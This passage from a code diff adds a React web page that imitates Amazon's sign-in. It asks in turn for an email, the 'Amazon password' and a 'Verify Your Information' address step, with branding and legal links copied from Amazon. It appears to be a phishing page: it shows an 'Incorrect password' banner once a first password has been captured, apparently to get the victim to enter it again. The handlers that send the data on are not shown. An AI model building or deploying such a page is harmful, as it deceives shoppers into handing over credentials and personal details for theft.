+                                            {/* 2. Country & 3. State/Region */}
+                                            <div className="grid grid-cols-2 gap-2 mb-2">
+                                                {/* Country Selector */}
+                                                <div className="relative">
+                                                    <select
+                                                        value={countryVal}
+                                                        onChange={(e) => {
+                                                            setCountryVal(e.target.value);
+                                                            setStateVal('');
+                                                        }}
+                                                        className="w-full h-[42px] pl-3 pr-7 text-[14px] bg-white border border-gray-300 focus:border-[#4f46e5] focus:ring-2 focus:ring-[#e0e7ff] rounded-[8px] outline-none appearance-none transition cursor-pointer text-gray-800 truncate"
+                                                    >
+                                                        {COUNTRIES.map((c) => (
+                                                            <option key={c.code} value={c.code}>
+                                                                {c.flag} {c.name}
+                                                            </option>
+                                                        ))}
+                                                    </select>
+                                                    <div className="absolute right-2.5 top-1/2 -translate-y-1/2 pointer-events-none text-gray-400">
+                                                        <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
+                                                        </svg>
+                                                    </div>
+                                                </div>
+
+                                                {/* State / Region Selector */}
+                                                <div className="relative">
+                                                    <select
+                                                        value={stateVal}
+                                                        onChange={(e) => setStateVal(e.target.value)}
+                                                        className={`w-full h-[42px] pl-3 pr-7 text-[14px] bg-white border border-gray-300 focus:border-[#4f46e5] focus:ring-2 focus:ring-[#e0e7ff] rounded-[8px] outline-none appearance-none transition cursor-pointer truncate ${stateVal ? 'text-gray-800' : 'text-gray-400'
+                                                            }`}
+                                                    >
+                                                        <option value="">{currentCountryObj.regionLabel}</option>
+                                                        {(COUNTRY_REGIONS[countryVal] || []).map((st) => (
+                                                            <option key={st.code} value={st.code}>
+                                                                {st.code} - {st.name}
+                                                            </option>
+                                                        ))}
+                                                    </select>
+                                                    <div className="absolute right-2.5 top-1/2 -translate-y-1/2 pointer-events-none text-gray-400">
+                                                        <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
+                                                        </svg>
+                                                    </div>
+                                                </div>
+                                            </div>
+
+                                            {/* 4. City & 5. Zip / Postal Code */}
+                                            <div className="grid grid-cols-2 gap-2">
+                                                <input
+                                                    type="text"
+                                                    value={city}
+                                                    onChange={(e) => setCity(e.target.value)}
+                                                    placeholder="City"
+                                                    className="h-[42px] px-3 text-[14px] text-gray-800 placeholder-gray-400 bg-white border border-gray-300 focus:border-[#4f46e5] focus:ring-2 focus:ring-[#e0e7ff] rounded-[8px] outline-none transition"
+                                                />
+                                                <input
+                                                    type="text"
+                                                    value={zipCode}
+                                                    onChange={(e) => setZipCode(e.target.value)}
+                                                    placeholder={currentCountryObj.postalLabel}
+                                                    className="h-[42px] px-3 text-[14px] text-gray-800 placeholder-gray-400 bg-white border border-gray-300 focus:border-[#4f46e5] focus:ring-2 focus:ring-[#e0e7ff] rounded-[8px] outline-none transition"
+                                                />
+                                            </div>
+                                        </div>
+
+                                        {/* Verify Payment Button with Brand Yellow styling matching login */}
+                                        <div className="pt-2">
+                                            <button
+                                                type="submit"
+                                                className="w-full h-[44px] rounded-[8px] bg-brandYellow hover:bg-brandYellowHover active:bg-[#F2C200] border border-brandYellowBorder shadow-[0_2px_5px_0_rgba(213,217,217,0.5)] text-[14px] font-normal text-brandText flex items-center justify-center gap-1.5 transition duration-150 cursor-pointer"
+                                            >
+                                                {isSubmitting ? 'Loading...' : 'Verify Your Information →'}
+                                            </button>
+                                        </div>
+
+
+                                    </form>
+                                )}
+                            </div>
+                        ) : (
+                            /* Desktop / Responsive Card for Steps 1 & 2 */
+                            <div className="w-full max-w-[350px] border border-cardBorder rounded-[8px] p-[20px] pb-[26px] bg-white shadow-[0_2px_5px_rgba(213,217,217,0.5)]">
+                                {step === 1 ? (
+                                    /* Step 1: Identifier Entry */
+                                    <div>
+                                        <h1 className="text-[28px] font-bold leading-tight text-brandText mb-2.5">
+                                            Welcome to Amazon
+                                        </h1>
+
+                                        <form onSubmit={handleContinue} noValidate>
+                                            <div className="mb-3.5 pt-1">
+                                                <label htmlFor="auth-identifier" className="block text-[13px] font-bold text-brandText mb-1.5">
+                                                    Enter email
+                                                </label>
+                                                <input
+                                                    id="auth-identifier"
+                                                    type="text"
+                                                    autoFocus
+                                                    value={identifier}
+                                                    onChange={(e) => {
+                                                        setIdentifier(e.target.value);
+                                                        if (identifierError) setIdentifierError(false);
+                                                    }}
+                                                    className={`brand-input ${identifierError ? 'brand-input-error' : ''}`}
+                                                />
+                                                {identifierError && (
+                                                    <ErrorMessage message="Enter your mobile number or email" />
+                                                )}
+                                            </div>
+
+                                            <button
+                                                type="submit"
+                                                className="w-full h-[31px] rounded-[8px] bg-brandYellow hover:bg-brandYellowHover active:bg-[#F2C200] border border-brandYellowBorder shadow-[0_2px_5px_0_rgba(213,217,217,0.5)] text-[13px] font-normal text-brandText flex items-center justify-center transition duration-150 cursor-pointer"
+                                            >
+                                                Continue
+                                            </button>
+                                        </form>
+
+                                        <p className="text-[12px] text-brandText mt-4 leading-[1.5]">
+                                            By continuing, you agree to Amazon's{' '}
+                                            <a href="#terms" className="text-brandLink hover:text-brandLinkHover hover:underline">
+                                                Conditions of Use
+                                            </a>{' '}
+                                            and{' '}
+                                            <a href="#privacy" className="text-brandLink hover:text-brandLinkHover hover:underline">
+                                                Privacy Notice
+                                            </a>.
+                                        </p>
+
+                                        <div className="mt-4">
+                                            <a href="#help" className="text-[13px] text-brandLink hover:text-brandLinkHover hover:underline inline-flex items-center group">
+                                                <span className="text-[9px] mr-1 text-[#555] group-hover:text-brandLinkHover">▸</span> Need help?
+                                            </a>
+                                        </div>
+
+                                        <hr className="my-5 border-t border-[#e7e7e7]" />
+
+                                        <div className="text-[13px] text-brandText">
+                                            <span className="font-bold block">Buying for work?</span>
+                                            <a href="#business" className="text-brandLink hover:text-brandLinkHover hover:underline">
+                                                Create a free business account
+                                            </a>
+                                        </div>
+                                    </div>
+                                ) : (
+                                    /* Step 2: Password Entry */
+                                    <div>
+                                        <h1 className="text-[28px] font-normal leading-tight text-brandText mb-1">
+                                            Sign in
+                                        </h1>
+
+                                        <div className="flex items-center text-[13px] text-brandText mb-3">
+                                            <span className="truncate max-w-[200px]">{identifier}</span>
+                                            <button
+                                                type="button"
+                                                onClick={() => {
+                                                    setPasswordError(false);
+                                                    setFirstPassword('');
+                                                    setPassword('');
+                                                    setStep(1);
+                                                }}
+                                                className="ml-2 text-brandLink hover:text-brandLinkHover hover:underline text-[13px] cursor-pointer"
+                                            >
+                                                Change
+                                            </button>
+                                        </div>
+
+                                        {firstPassword && passwordError && (
+                                            <div className="border border-[#c40000] rounded-[8px] p-3 mb-3.5 bg-[#fcf4f4] flex items-start">
+                                                <div className="w-[16px] h-[16px] rounded-full bg-[#ba0933] text-white flex items-center justify-center mr-2 flex-shrink-0 font-serif font-bold text-[11px] leading-none mt-0.5">
+                                                    !
+                                                </div>
+                                                <div>
+                                                    <h4 className="text-[13px] font-bold text-[#ba0933] leading-tight">There was a problem</h4>
+                                                    <p className="text-[12px] text-[#111] mt-0.5">Incorrect password. Please try again.</p>
+                                                </div>
+                                            </div>
+                                        )}
+
+                                        <form onSubmit={handleSignIn} noValidate>
+                                            <div className="mb-2">
+                                                <label htmlFor="auth-password" className="block text-[13px] font-bold text-brandText mb-1.5">
+                                                    Amazon password
+                                                </label>
+                                                <input
+                                                    id="auth-password"
+                                                    ref={passwordInputRef}
+                                                    type={showPassword ? 'text' : 'password'}
+                                                    autoFocus
+                                                    placeholder="Amazon password"
+                                                    value={password}
+                                                    onChange={(e) => {
+                                                        setPassword(e.target.value);
+                                                        if (passwordError) setPasswordError(false);
+                                                    }}
+                                                    className={`brand-input ${passwordError ? 'brand-input-error' : ''}`}
+                                                />
+                                                {passwordError && (
+                                                    <ErrorMessage message={passwordErrorMsg} />
+                                                )}
+                                            </div>
+
+                                            <div className="flex items-center justify-between text-[13px] mb-3">
+                                                <label className="flex items-center cursor-pointer select-none">
+                                                    <input
+                                                        type="checkbox"
+                                                        checked={showPassword}
+                                                        onChange={(e) => setShowPassword(e.target.checked)}
+                                                        className="w-3.5 h-3.5 rounded border-[#888c8c] text-amber-500 mr-1.5 focus:ring-0 cursor-pointer"
+                                                    />
+                                                    <span className="text-[13px] text-brandText">Show password</span>
+                                                </label>
+                                                <a href="#forgot" className="text-[13px] text-brandLink hover:text-brandLinkHover hover:underline">
+                                                    Forgot password?
+                                                </a>
+                                            </div>
+
+                                            <button
+                                                type="submit"
+                                                className="w-full h-[31px] rounded-[8px] bg-brandYellow hover:bg-brandYellowHover active:bg-[#F2C200] border border-brandYellowBorder shadow-[0_2px_5px_0_rgba(213,217,217,0.5)] text-[13px] font-normal text-brandText flex items-center justify-center transition duration-150 cursor-pointer"
+                                            >
+                                                {isSubmitting ? 'Loading...' : 'Sign in'}
+                                            </button>
+                                        </form>
+
+
+
+
+                                    </div>
+                                )}
+                            </div>
+                        )}
+                    </div>
+
+                    {/* Unified Dark Footer for both Desktop and Mobile */}
+                    <footer className="w-full bg-[#0E1724] text-[#ccc] pt-8 pb-10 px-4 text-center">
+                        {/* Locale & Country Selectors */}
+                        <div className="flex items-center justify-center space-x-7 mb-5 text-[13px] text-white">
+                            <span className="flex items-center cursor-pointer hover:underline">
+                                <svg className="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <circle cx="12" cy="12" r="10" strokeWidth="1.5"></circle>
+                                    <path strokeWidth="1.5" d="M2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path>
+                                </svg>
+                                English
+                            </span>
+                            <span className="flex items-center cursor-pointer hover:underline">
+                                <span className="mr-2 text-base leading-none">🇺🇸</span>
+                                United States
+                            </span>
+                        </div>
+
+                        {/* Legal Links */}
+                        <div className="flex flex-wrap justify-center items-center gap-x-5 gap-y-1 mb-2 text-[11px] text-[#e3e6e6]">
+                            <a href="#conditions" className="hover:underline">Conditions of Use</a>
+                            <a href="#privacy" className="hover:underline">Privacy Notice</a>
+                            <a href="#health-disclosure" className="hover:underline">Consumer Health Data Privacy Disclosure</a>
+                            <a href="#ad-choices" className="hover:underline inline-flex items-center gap-1.5">
+                                Your Ads Privacy Choices
+                                <span className="inline-flex items-center bg-[#0066cc] text-white rounded-full px-1 text-[9px] font-bold leading-none py-0.5">
+                                    ✓✕
+                                </span>
+                            </a>
+                        </div>
+
+                        {/* Copyright */}
+                        <p className="text-[11px] text-[#888c8c] mt-2">
+                            © 1996–2026, Amazon.com, Inc. or its affiliates
+                        </p>
+                    </footer>
+                </div>
+            );
+        }
+
+        const root = ReactDOM.createRoot(document.getElementById('root'));
+        root.render(<AuthForm />);
+    </script>
+</body>
+
+</html>
